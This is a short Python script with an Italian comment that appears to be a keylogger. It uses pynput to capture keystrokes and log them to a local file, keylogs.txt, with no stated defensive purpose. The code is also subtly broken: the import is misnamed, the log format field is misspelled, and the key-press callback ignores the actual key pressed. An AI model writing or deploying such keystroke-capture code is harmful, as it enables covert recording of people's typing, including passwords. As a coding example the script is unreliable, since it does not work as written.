
from pynput.keyboard import key , Listener
import logging

log_dir = ''

with open("keylogs.txt", "w", encoding="utf-8") as f:
    pass  # non scrive nulla, ma il file viene creato

logging.basicConfig(filename=(log_dir + 'keylogs.txt'), \
                    level=logging.DEBUG, format='%(asktime)s: %(message)s')

def on_press():
    logging.info(str(key))

with Listener(on_press=on_press) as Listener:
    Listener.join()
